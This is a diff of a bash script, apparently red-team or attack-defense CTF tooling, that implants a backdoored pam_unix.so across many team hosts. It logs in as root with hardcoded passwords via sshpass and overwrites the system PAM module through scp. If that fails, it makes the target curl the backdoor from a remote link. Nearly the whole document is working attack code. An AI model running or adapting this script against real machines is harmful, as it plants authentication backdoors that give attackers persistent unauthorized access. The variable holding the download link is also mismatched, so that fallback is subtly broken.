@@ -1,16 +1,18 @@
 #!/bin/bash
 
+username="root"
+password="Password1!"
+
+timeout=5
+max_jobs=10
+path_to_pam="/lib/x86_64-linux-gnu/security/pam_unix.so"
+path_to_backdoored_pam="/tmp/pam_unix.so"
+link_to_backdoored_pam=""
+
 IPs=()
 network_id="1.1"
 number_of_teams=10
 host_ids=(1 2 3)
-
-username="root"
-password="password"
-
-timeout=5
-path_to_pam="/lib/x86_64-linux-gnu/security"
-local_pam_file="/tmp/pam_unix.so"
 
 create_IPs() {
     for ((team=1; team<=number_of_teams; team++)); do
@@ -22,18 +24,28 @@ create_IPs() {
 
 main() {
     create_IPs
-    export password timeout path_to_pam local_pam_file
 
-    printf "%s\n" "${IPs[@]}" | xargs -P 20 -n1 -I {} bash -c '
-        IP="{}"
-        sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$local_pam_file" "$username@$IP:$path_to_pam/pam_unix.so" || true
+    job_count=0
+    for IP in "${IPs[@]}"; do
+        {
+            sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$path_to_backdoored_pam" "$username@$IP:$path_to_pam" && \
+            echo "SUCCESS  (SCP): $IP" || \
+            {
+                sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "echo \"$password\" | sudo -S curl -o \"$path_to_pam\" \"$backdoor_link\"" && \
+                echo "SUCCESS (CURL): $IP" || \
+                echo "FAIL    (CURL): $IP"
+            }
+        } &
 
-        if [ $? -eq 0 ]; then
-            echo "Successfully implanted backdoor at $local_ip"
-        else
-            echo "Failed to implant backdoor at $local_ip"
+        ((job_count++))
+
+        if ((job_count >= max_jobs)); then
+            wait -n
+            ((job_count--))
         fi
-    '
+    done
+
+    wait
 }
 
 main
